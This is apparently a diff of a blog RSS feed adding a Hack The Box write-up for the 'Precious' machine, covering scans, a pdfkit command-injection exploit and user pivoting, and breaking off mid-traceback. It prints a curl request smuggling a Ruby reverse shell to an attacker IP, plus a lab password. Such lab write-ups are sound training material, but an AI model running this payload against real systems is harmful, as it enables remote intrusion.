@@ -2,16 +2,251 @@
 <rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
     <channel>
         <title>Posts on phire heavy industries</title>
-        <link>https://www.phireheavyindustries.com/post/</link>
+        <link>https://www.phireheavyindustries.com&#34;/post/</link>
         <description>Recent content in Posts on phire heavy industries</description>
         <generator>Hugo -- gohugo.io</generator>
         <language>en-us</language>
-        <lastBuildDate>Tue, 24 May 2022 00:00:00 +0000</lastBuildDate><atom:link href="https://www.phireheavyindustries.com/post/index.xml" rel="self" type="application/rss+xml" /><item>
+        <lastBuildDate>Sat, 07 Jan 2023 00:00:00 +0000</lastBuildDate><atom:link href="https://www.phireheavyindustries.com\"/post/index.xml" rel="self" type="application/rss+xml" /><item>
+        <title>Precious</title>
+        <link>https://www.phireheavyindustries.com&#34;/p/precious/</link>
+        <pubDate>Sat, 07 Jan 2023 00:00:00 +0000</pubDate>
+        
+        <guid>https://www.phireheavyindustries.com&#34;/p/precious/</guid>
+        <description>&lt;p&gt;Box URL: &lt;a class=&#34;link&#34; href=&#34;https://app.hackthebox.com/machines/Precious&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;https://app.hackthebox.com/machines/Precious&lt;/a&gt;
+Host: precious.htb
+IP: 10.10.11.189
+Status: Done
+Tags: easy, hackthebox, writeup&lt;/p&gt;
+&lt;p&gt;I start with the usual nmap&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# Nmap 7.93 scan initiated Sat Jan  7 20:40:32 2023 as: nmap -sC -sV -Pn -on 10.10.11.189&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Nmap scan report &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; 10.10.11.189
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Host is up &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;0.044s latency&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;.
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Not shown: &lt;span class=&#34;m&#34;&gt;998&lt;/span&gt; closed tcp ports &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;conn-refused&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;PORT   STATE SERVICE VERSION
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;protocol 2.0&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; ssh-hostkey: 
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   &lt;span class=&#34;m&#34;&gt;3072&lt;/span&gt; 845e13a8e31e20661d235550f63047d2 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;RSA&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;   &lt;span class=&#34;m&#34;&gt;256&lt;/span&gt; a2ef7b9665ce4161c467ee4e96c7c892 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;ECDSA&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_  &lt;span class=&#34;m&#34;&gt;256&lt;/span&gt; 33053dcd7ab798458239e7ae3c91a658 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;ED25519&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;80/tcp open  http    nginx 1.18.0
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_http-server-header: nginx/1.18.0
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;|&lt;/span&gt;_http-title: Did not follow redirect to http://precious.htb/
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Service Info: OS: Linux&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; CPE: cpe:/o:linux:linux_kernel
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# Nmap done at Sat Jan  7 20:40:42 2023 -- 1 IP address (1 host up) scanned in 9.87 seconds&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;Searching for subdirectories finds nothing. Let&amp;rsquo;s also fire up Nikto.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;- Nikto v2.1.6
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;---------------------------------------------------------------------------
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;+ Target IP:          10.10.11.189
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;+ Target Hostname:    precious.htb
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;+ Target Port:        &lt;span class=&#34;m&#34;&gt;80&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;+ Start Time:         2023-01-07 23:40:17 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;GMT0&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;---------------------------------------------------------------------------
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;+ Server: nginx/1.18.0 + Phusion Passenger&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;R&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; 6.0.15
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;+ Retrieved x-powered-by header: Phusion Passenger&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;R&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; 6.0.15
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;+ Uncommon header &lt;span class=&#34;s1&#34;&gt;&amp;#39;x-runtime&amp;#39;&lt;/span&gt; found, with contents: Ruby
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;+ Uncommon header &lt;span class=&#34;s1&#34;&gt;&amp;#39;x-cascade&amp;#39;&lt;/span&gt; found, with contents: pass
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;+ No CGI Directories found &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;use &lt;span class=&#34;s1&#34;&gt;&amp;#39;-C all&amp;#39;&lt;/span&gt; to force check all possible &lt;span class=&#34;nb&#34;&gt;dirs&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;+ Server banner has changed from &lt;span class=&#34;s1&#34;&gt;&amp;#39;nginx/1.18.0 + Phusion Passenger(R) 6.0.15&amp;#39;&lt;/span&gt; to &lt;span class=&#34;s1&#34;&gt;&amp;#39;nginx/1.18.0&amp;#39;&lt;/span&gt; which may suggest a WAF, load balancer or proxy is in place
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;+ &lt;span class=&#34;m&#34;&gt;7785&lt;/span&gt; requests: &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt; error&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;s&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; and &lt;span class=&#34;m&#34;&gt;3&lt;/span&gt; item&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;s&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; reported on remote host
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;+ End Time:           2023-01-07 23:47:05 &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;GMT0&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;408&lt;/span&gt; seconds&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;---------------------------------------------------------------------------
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;+ &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; host&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;s&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; tested
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;I can produce a PDF, setting up a local webserver with a simple html page. Checking the properties of the PDF as was suggested by some users on the HTB Board, i notice that pdfkit v0.8.6 is used. Checking the vulnerabilites, for this software there is one that seems usable.&lt;/p&gt;
+&lt;p&gt;The following &lt;a class=&#34;link&#34; href=&#34;https://www.ctfiot.com/84447.html&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
+    &gt;site&lt;/a&gt; has an explanation on exploiting this vulnerability, this is done using a constructed payload with curl and getting a reverse shell. Using this method i can get a reverse shell and login with the user ruby.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;curl &lt;span class=&#34;s1&#34;&gt;&amp;#39;http://precious.htb/&amp;#39;&lt;/span&gt; -X POST -H &lt;span class=&#34;s1&#34;&gt;&amp;#39;User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0&amp;#39;&lt;/span&gt; -H &lt;span class=&#34;s1&#34;&gt;&amp;#39;Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,/;q=0.8&amp;#39;&lt;/span&gt; -H &lt;span class=&#34;s1&#34;&gt;&amp;#39;Accept-Language: en-US,en;q=0.5&amp;#39;&lt;/span&gt; -H &lt;span class=&#34;s1&#34;&gt;&amp;#39;Accept-Encoding: gzip, deflate&amp;#39;&lt;/span&gt; -H &lt;span class=&#34;s1&#34;&gt;&amp;#39;Content-Type: application/x-www-form-urlencoded&amp;#39;&lt;/span&gt; -H &lt;span class=&#34;s1&#34;&gt;&amp;#39;Origin: TARGET_URL&amp;#39;&lt;/span&gt; -H &lt;span class=&#34;s1&#34;&gt;&amp;#39;Connection: keep-alive&amp;#39;&lt;/span&gt; -H &lt;span class=&#34;s1&#34;&gt;&amp;#39;Referer: TARGET_URL&amp;#39;&lt;/span&gt; -H &lt;span class=&#34;s1&#34;&gt;&amp;#39;Upgrade-Insecure-Requests: 1&amp;#39;&lt;/span&gt; --data-raw &lt;span class=&#34;s1&#34;&gt;&amp;#39;url=http%3A%2F%2FLOCAL-IP%3A10.10.14.159:8000%2F%3Fname%3D%2520%60+ruby+-rsocket+-e%27spawn%28%22sh%22%2C%5B%3Ain%2C%3Aout%2C%3Aerr%5D%3D%3ETCPSocket.new%28%2210.10.14.159%22%2C9001%29%29%27%60&amp;#39;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;After getting a reverse shell i find two homefolders, one for a user ruby and another for a user henry. CDing into the henry folder, i can see that the user flag is there, but i cannot read it. I then look for files with ls -la and find nothing interesting. Backing out to the ruby folder there is a hidden folder with a config file inside. The contents of this file look like credentials to the henry user. Using these credentials to open a ssh session grants me the flag for the user.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;cd&lt;/span&gt; ruby
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;ls -la
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;total &lt;span class=&#34;m&#34;&gt;28&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;drwxr-xr-x &lt;span class=&#34;m&#34;&gt;4&lt;/span&gt; ruby ruby &lt;span class=&#34;m&#34;&gt;4096&lt;/span&gt; Jan  &lt;span class=&#34;m&#34;&gt;8&lt;/span&gt; 14:34 .
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;drwxr-xr-x &lt;span class=&#34;m&#34;&gt;4&lt;/span&gt; root root &lt;span class=&#34;m&#34;&gt;4096&lt;/span&gt; Oct &lt;span class=&#34;m&#34;&gt;26&lt;/span&gt; 08:28 ..
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;lrwxrwxrwx &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; root root    &lt;span class=&#34;m&#34;&gt;9&lt;/span&gt; Oct &lt;span class=&#34;m&#34;&gt;26&lt;/span&gt; 07:53 .bash_history -&amp;gt; /dev/null
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;-rw-r--r-- &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; ruby ruby  &lt;span class=&#34;m&#34;&gt;220&lt;/span&gt; Mar &lt;span class=&#34;m&#34;&gt;27&lt;/span&gt;  &lt;span class=&#34;m&#34;&gt;2022&lt;/span&gt; .bash_logout
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;-rw-r--r-- &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; ruby ruby &lt;span class=&#34;m&#34;&gt;3526&lt;/span&gt; Mar &lt;span class=&#34;m&#34;&gt;27&lt;/span&gt;  &lt;span class=&#34;m&#34;&gt;2022&lt;/span&gt; .bashrc
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;dr-xr-xr-x &lt;span class=&#34;m&#34;&gt;2&lt;/span&gt; root ruby &lt;span class=&#34;m&#34;&gt;4096&lt;/span&gt; Oct &lt;span class=&#34;m&#34;&gt;26&lt;/span&gt; 08:28 .bundle
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;drwxr-xr-x &lt;span class=&#34;m&#34;&gt;3&lt;/span&gt; ruby ruby &lt;span class=&#34;m&#34;&gt;4096&lt;/span&gt; Jan  &lt;span class=&#34;m&#34;&gt;8&lt;/span&gt; 14:34 .cache
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;-rw-r--r-- &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; ruby ruby  &lt;span class=&#34;m&#34;&gt;807&lt;/span&gt; Mar &lt;span class=&#34;m&#34;&gt;27&lt;/span&gt;  &lt;span class=&#34;m&#34;&gt;2022&lt;/span&gt; .profile
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;cat .bundle
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;cat: .bundle: Is a directory
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nb&#34;&gt;cd&lt;/span&gt; .bundle
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;ls
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;config
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;cat config
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;---
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;BUNDLE_HTTPS://RUBYGEMS__ORG/: &lt;span class=&#34;s2&#34;&gt;&amp;#34;henry:Q3c1AqGHtoI0aXAYFH&amp;#34;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;After getting a user shell, i run sudo -l to see what commands can this user run as root. There is only one command that seems to be a ruby script that updates dependencies.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;henry@precious:~$ sudo -l
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Matching Defaults entries &lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; henry on precious:
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    env_reset, mail_badpass, &lt;span class=&#34;nv&#34;&gt;secure_path&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;/usr/local/sbin&lt;span class=&#34;se&#34;&gt;\:&lt;/span&gt;/usr/local/bin&lt;span class=&#34;se&#34;&gt;\:&lt;/span&gt;/usr/sbin&lt;span class=&#34;se&#34;&gt;\:&lt;/span&gt;/usr/bin&lt;span class=&#34;se&#34;&gt;\:&lt;/span&gt;/sbin&lt;span class=&#34;se&#34;&gt;\:&lt;/span&gt;/bin
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;User henry may run the following commands on precious:
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;root&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt; NOPASSWD: /usr/bin/ruby /opt/update_dependencies.rb
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;I try to run commands in parallel, but that doesn’t work. Also, i notice that whatever folder i’m in, the command always returns the same error, stating that it cannot find a file.&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;henry@precious:~$ sudo ruby /opt/update_dependencies.rb 
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;Traceback &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;most recent call last&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;:
